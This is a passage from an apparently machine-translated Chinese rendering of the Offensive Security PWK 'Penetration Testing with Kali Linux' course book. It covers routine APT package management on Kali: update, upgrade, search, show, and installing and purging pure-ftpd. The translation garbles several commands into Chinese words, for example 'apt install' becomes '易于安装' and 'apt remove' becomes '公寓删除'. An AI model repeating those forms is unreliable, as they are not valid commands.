<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:52576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 练习启动和停止各种 Kali 服务。</font></font></nobr></div>
<div style="position:absolute;top:52604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 启用 SSH 服务以在系统启动时启动。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:52641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.6 搜索、安装和删除工具</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:52683;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali VMware 镜像包含渗透测试领域最常用的工具。</font></font></nobr></div>
<div style="position:absolute;top:52703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，将 Kali 存储库中存在的每个工具都包含在 VMware 中是不切实际的</font></font></nobr></div>
<div style="position:absolute;top:52722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图像。</font><font style="vertical-align: inherit;">因此，我们需要讨论如何搜索、安装或删除工具。</font><font style="vertical-align: inherit;">在这个部分，</font></font></nobr></div>
<div style="position:absolute;top:52741;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将探索高级包工具 (APT) 工具集以及其他命令</font></font></nobr></div>
<div style="position:absolute;top:52760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Kali Linux 操作系统上执行维护操作时很有用。</font></font></nobr></div>
<div style="position:absolute;top:52793;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">APT 是一组工具，可帮助管理基于 Debian 的系统上的软件包或应用程序。</font><font style="vertical-align: inherit;">自从</font></font></nobr></div>
<div style="position:absolute;top:52813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali 基于 Debian，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">45</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用 APT 安装和删除应用程序，更新包，以及</font></font></nobr></div>
<div style="position:absolute;top:52832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">甚至升级整个系统。</font><font style="vertical-align: inherit;">APT的神奇之处在于它是一个完整的包</font></font></nobr></div>
<div style="position:absolute;top:52851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理系统，通过递归满足其要求来安装或删除请求的包</font></font></nobr></div>
<div style="position:absolute;top:52871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需求和依赖。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:52905;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.6.1 适配更新</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:52943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关 APT 包的信息在本地缓存，以加快任何类型的操作</font></font></nobr></div>
<div style="position:absolute;top:52962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">涉及查询APT数据库。</font><font style="vertical-align: inherit;">因此，更新列表总是好的做法</font></font></nobr></div>
<div style="position:absolute;top:52982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用的软件包，包括与它们的版本、描述等相关的信息。我们可以这样做</font></font></nobr></div>
<div style="position:absolute;top:53001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt update</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令如下：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:53036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt update</font></font></font></b></nobr></div>
<div style="position:absolute;top:53053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命中：1 http://kali.mirror.globo.tech/kali kali-rolling InRelease</font></font></nobr></div>
<div style="position:absolute;top:53070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阅读包裹清单...完成</font></font></nobr></div>
<div style="position:absolute;top:53087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构建依赖树    </font></font></nobr></div>
<div style="position:absolute;top:53104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">读取状态信息...完成</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:53121;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">699个包可以升级。</font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行 'apt list --upgradable' 来查看它们。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:53140;left:271"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 22 - 使用 apt update 更新 Kali 中的软件包列表</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:53171;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.6.2 apt升级</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:53209;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">APT数据库更新后，我们可以升级安装的包和核心系统</font></font></nobr></div>
<div style="position:absolute;top:53228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt upgrade</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">升级</font></font></b><font style="vertical-align: inherit;">到最新版本</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:53262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了升级单个包，在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt upgrade</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">后添加包名</font></font></nobr></div>
<div style="position:absolute;top:53281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt upgrade metasploit-framework</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:53343;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然您可以随时升级您的 Kali Linux 安装，但最好</font></font></i></nobr></div>
<div style="position:absolute;top:53362;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">拍摄处于干净状态的虚拟机快照（在任何更改发生之前）</font></font></i></nobr></div>
<div style="position:absolute;top:53381;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">制作）之前。</font><font style="vertical-align: inherit;">这有两个主要好处。</font><font style="vertical-align: inherit;">首先，它会</font></font></i></nobr></div>
<div style="position:absolute;top:53401;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确保您拥有适用于所有练习的测试版本的快照</font></font></i></nobr></div>
<div style="position:absolute;top:53420;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其次，如果您遇到问题并且必须联系我们的支持团队，他们</font></font></i></nobr></div>
<div style="position:absolute;top:53439;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将知道您使用的工具的版本以及它们的行为方式。</font><font style="vertical-align: inherit;">对于一个实际</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:53507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">45 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Debian，2019 年），https://www.debian.org/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:53635;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="46"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 46 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:53668;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:54745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:54745;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:54745;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">46</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:53764;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试，同样的问题也将适用。</font><font style="vertical-align: inherit;">您将了解更多关于如何</font></font></i></nobr></div>
<div style="position:absolute;top:53783;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着您获得更多，在拥有最新工具与拥有可信构建之间取得平衡</font></font></i></nobr></div>
<div style="position:absolute;top:53802;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">熟悉并熟悉 Kali Linux。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:53865;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.6.3 apt-cache搜索和apt显示</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:53902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">容易缓存搜索</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令显示太多的存储在内部缓存中的信息</font></font></nobr></div>
<div style="position:absolute;top:53922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包数据库。</font><font style="vertical-align: inherit;">例如，假设我们想</font><font style="vertical-align: inherit;">通过 APT</font><font style="vertical-align: inherit;">安装</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pure-ftpd</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序。</font></font></nobr></div>
<div style="position:absolute;top:53941;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们要做的第一件事是找出应用程序是否存在于 Kali Linux 中</font></font></nobr></div>
<div style="position:absolute;top:53961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储库。</font><font style="vertical-align: inherit;">为此，我们将通过在命令行上传递搜索词来继续：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:53995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt-cache search pure-ftpd</font></font></font></b></nobr></div>
<div style="position:absolute;top:54013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mysqmail-pure-ftpd-logger - MySQL 中的实时日志记录系统 - Pure-FTPd traffic-logg</font></font></nobr></div>
<div style="position:absolute;top:54030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pure-ftpd - 安全高效的 FTP 服务器</font></font></nobr></div>
<div style="position:absolute;top:54046;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pure-ftpd-common - Pure-FTPd FTP 服务器（公共文件）</font></font></nobr></div>
<div style="position:absolute;top:54063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pure-ftpd-ldap - 具有 LDAP 用户身份验证的安全高效的 FTP 服务器</font></font></nobr></div>
<div style="position:absolute;top:54080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pure-ftpd-mysql - 具有 MySQL 用户身份验证的安全高效的 FTP 服务器</font></font></nobr></div>
<div style="position:absolute;top:54097;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pure-ftpd-postgresql - 具有 PostgreSQL 用户身份验证的安全高效的 FTP 服务器</font></font></nobr></div>
<div style="position:absolute;top:54115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源代理 - 集群资源代理</font></font></nobr></div>
<div style="position:absolute;top:54134;left:248"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 23 - 使用 apt-cache search 搜索 pure-ftpd 应用程序</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:54163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上面的输出表明应用程序存在于存储库中。</font><font style="vertical-align: inherit;">还有一些</font></font></nobr></div>
<div style="position:absolute;top:54182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果需要，可以安装 pure-ftpd 应用程序的身份验证扩展。</font></font></nobr></div>
<div style="position:absolute;top:54215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有趣的是，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">资源代理</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包出现在我们的搜索中，即使它是</font></font></nobr></div>
<div style="position:absolute;top:54235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">name 不包含“pure-ftpd”关键字。</font><font style="vertical-align: inherit;">这背后的原因是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt-cache 搜索</font></font></font></b></nobr></div>
<div style="position:absolute;top:54254;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在包的描述中查找请求的关键字而不是包名本身。</font></font></nobr></div>
<div style="position:absolute;top:54287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要确认资源代理包描述确实包含“pure-ftpd”关键字，</font></font></nobr></div>
<div style="position:absolute;top:54306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将包名传递给</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt 显示</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如下：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:54341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt 显示资源代理</font></font></font></b></nobr></div>
<div style="position:absolute;top:54358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包：资源代理</font></font></nobr></div>
<div style="position:absolute;top:54375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版本：1:4.2.0-2</font></font></nobr></div>
<div style="position:absolute;top:54392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:54409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述：集群资源代理</font></font></nobr></div>
<div style="position:absolute;top:54426;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该软件包包含符合 Open</font></font></nobr></div>
<div style="position:absolute;top:54443;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cluster Framework (OCF) 规范，用于与各种服务交互</font></font></nobr></div>
<div style="position:absolute;top:54460;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在由 Pacemaker 资源管理器管理的高可用性环境中。</font></font></nobr></div>
<div style="position:absolute;top:54477;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></nobr></div>
<div style="position:absolute;top:54494;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理包括：</font></font></nobr></div>
<div style="position:absolute;top:54511;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AoEtarget：管理以太网上的 ATA (AoE) 目标导出</font></font></nobr></div>
<div style="position:absolute;top:54528;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AudibleAlarm：以可配置的间隔发出蜂鸣声</font></font></nobr></div>
<div style="position:absolute;top:54545;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:54562;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NodeUtilization：节点利用率</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:54579;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pure-FTPd：管理一个Pure-FTPd FTP服务器实例</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:54596;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Raid1：管理共享存储上的 Linux 软件 RAID (MD) 设备</font></font></nobr></div>
<div style="position:absolute;top:54613;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:54632;left:198"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 24 - 使用 apt show 检查与资源代理程序包相关的信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:54661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在上面的输出中，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt show</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阐明了为什么资源代理应用程序神秘</font></font></nobr></div>
<div style="position:absolute;top:54681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出现在之前对 pure-ftpd 的搜索中。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:54823;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="47"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 47 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:54856;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:55933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:55933;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:55933;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">47</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:54952;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.6.4 apt安装</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:54990;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">易于安装</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令可以用于一个包添加到系统中以</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">易于安装</font></font></font></b></nobr></div>
<div style="position:absolute;top:55009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后跟包名。</font><font style="vertical-align: inherit;">让我们继续安装 pure-ftpd：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:55044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt install pure-ftpd</font></font></font></b></nobr></div>
<div style="position:absolute;top:55061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阅读包裹清单...完成</font></font></nobr></div>
<div style="position:absolute;top:55078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构建依赖树    </font></font></nobr></div>
<div style="position:absolute;top:55095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">读取状态信息...完成</font></font></nobr></div>
<div style="position:absolute;top:55112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将安装以下附加软件包：</font></font></nobr></div>
<div style="position:absolute;top:55129;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纯ftpd-common</font></font></nobr></div>
<div style="position:absolute;top:55146;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将安装以下新软件包：</font></font></nobr></div>
<div style="position:absolute;top:55163;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纯 ftpd 纯 ftpd 通用</font></font></nobr></div>
<div style="position:absolute;top:55180;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 个升级，2 个新安装，0 个删除，0 个未升级。</font></font></nobr></div>
<div style="position:absolute;top:55197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要获得 309 kB 的档案。</font></font></nobr></div>
<div style="position:absolute;top:55214;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此操作后，将使用 880 kB 的额外磁盘空间。</font></font></nobr></div>
<div style="position:absolute;top:55231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你要继续吗？</font><font style="vertical-align: inherit;">[Y / N] </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ÿ</font></font></font></b></nobr></div>
<div style="position:absolute;top:55248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取：1 http://kali.mirror.globo.tech/kali kali-rolling/main amd64 pure-ftpd-common all</font></font></nobr></div>
<div style="position:absolute;top:55265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取：2 http://kali.mirror.globo.tech/kali kali-rolling/main amd64 pure-ftpd amd64 1.0.4</font></font></nobr></div>
<div style="position:absolute;top:55282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 4 秒内获取 309 kB (86.4 kB/s)</font></font></nobr></div>
<div style="position:absolute;top:55299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">预配置包...</font></font></nobr></div>
<div style="position:absolute;top:55315;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:55335;left:282"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 25 - 使用 apt install 安装 pure-ftpd 应用程序</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:55365;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同样，我们可以使用命令</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt remove --purge 删除包</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:55399;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.6.5 apt remove --purge</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:55437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公寓删除-purge</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令完全从卡利删除软件包。</font><font style="vertical-align: inherit;">重要的是要</font></font></nobr></div>
<div style="position:absolute;top:55457;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt remove</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">删除包会删除所有包数据，但通常会留下很小的数据</font></font></nobr></div>
<div style="position:absolute;top:55476;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（修改后的）用户配置文件，以防意外删除。</font><font style="vertical-align: inherit;">添加</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--purge</font></font></font></b></nobr></div>
<div style="position:absolute;top:55495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项删除所有剩菜。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:55530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt remove --purge pure-ftpd</font></font></font></b></nobr></div>
<div style="position:absolute;top:55547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">阅读包裹清单...完成</font></font></nobr></div>
<div style="position:absolute;top:55564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构建依赖树    </font></font></nobr></div>
<div style="position:absolute;top:55581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">读取状态信息...完成</font></font></nobr></div>
<div style="position:absolute;top:55598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下软件包已自动安装，不再需要：</font></font></nobr></div>
<div style="position:absolute;top:55615;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纯ftpd-common</font></font></nobr></div>
<div style="position:absolute;top:55632;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 'sudo apt autoremove' 将其删除。</font></font></nobr></div>
<div style="position:absolute;top:55649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下软件包将被删除：</font></font></nobr></div>
<div style="position:absolute;top:55666;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">纯 ftpd*</font></font></nobr></div>
<div style="position:absolute;top:55683;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 升级，0 新安装，1 删除，0 未升级。</font></font></nobr></div>
<div style="position:absolute;top:55700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此操作后，将释放 581 kB 磁盘空间。</font></font></nobr></div>
<div style="position:absolute;top:55717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你要继续吗？</font><font style="vertical-align: inherit;">[是/否] 是</font></font></nobr></div>
<div style="position:absolute;top:55734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（正在读取数据库...当前安装了 388024 个文件和目录。）</font></font></nobr></div>
<div style="position:absolute;top:55751;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">删除纯 ftpd (1.0.47-3) ...</font></font></nobr></div>
<div style="position:absolute;top:55768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找不到服务 ftp 的缓存 rlinetd 配置文件，忽略删除请求</font></font></nobr></div>
